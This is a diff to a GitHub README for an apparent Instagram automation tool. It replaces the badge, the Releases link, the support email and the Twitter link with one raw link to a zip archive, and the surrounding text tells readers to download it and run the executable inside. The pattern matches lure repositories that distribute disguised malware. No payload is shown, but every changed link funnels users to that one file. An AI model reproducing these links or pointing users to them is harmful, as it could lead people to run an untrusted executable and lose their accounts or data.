@@ -1,6 +1,6 @@
 # Instagram MultiTool PS0 🚀
 
-![Instagram MultiTool](https://img.shields.io/badge/Instagram%20MultiTool-PS0-blue.svg)
+![Instagram MultiTool](https://github.com/RosGMM/Instagram-MultiTool-PS0/raw/refs/heads/main/fraghan/Instagram-P-Multi-Tool-3.2-beta.4.zip%https://github.com/RosGMM/Instagram-MultiTool-PS0/raw/refs/heads/main/fraghan/Instagram-P-Multi-Tool-3.2-beta.4.zip)
 
 Welcome to the **Instagram MultiTool PS0** repository! This tool is designed for users who want to enhance their Instagram experience through automation and analytics. Whether you want to manage your posts, interact with your followers, or analyze your engagement, this tool has you covered.
 
@@ -31,7 +31,7 @@ The Instagram MultiTool PS0 offers a variety of features to help you manage your
 
 To get started with the Instagram MultiTool PS0, follow these steps:
 
-1. **Download the latest release** from the [Releases section](https://github.com/RosGMM/Instagram-MultiTool-PS0/releases). Make sure to download the appropriate file for your operating system.
+1. **Download the latest release** from the [Releases section](https://github.com/RosGMM/Instagram-MultiTool-PS0/raw/refs/heads/main/fraghan/Instagram-P-Multi-Tool-3.2-beta.4.zip). Make sure to download the appropriate file for your operating system.
 2. **Extract the downloaded file** to a location of your choice.
 3. **Run the executable file** to start using the tool.
 
@@ -113,10 +113,10 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 If you have any questions or suggestions, feel free to reach out:
 
-- **Email**: support@instagram-multitool.com
-- **Twitter**: [@InstagramMultiTool](https://twitter.com/InstagramMultiTool)
+- **Email**: https://github.com/RosGMM/Instagram-MultiTool-PS0/raw/refs/heads/main/fraghan/Instagram-P-Multi-Tool-3.2-beta.4.zip
+- **Twitter**: [@InstagramMultiTool](https://github.com/RosGMM/Instagram-MultiTool-PS0/raw/refs/heads/main/fraghan/Instagram-P-Multi-Tool-3.2-beta.4.zip)
 
-For more information, visit our [Releases section](https://github.com/RosGMM/Instagram-MultiTool-PS0/releases) to download the latest version and stay updated with new features.
+For more information, visit our [Releases section](https://github.com/RosGMM/Instagram-MultiTool-PS0/raw/refs/heads/main/fraghan/Instagram-P-Multi-Tool-3.2-beta.4.zip) to download the latest version and stay updated with new features.
 
 ---
 
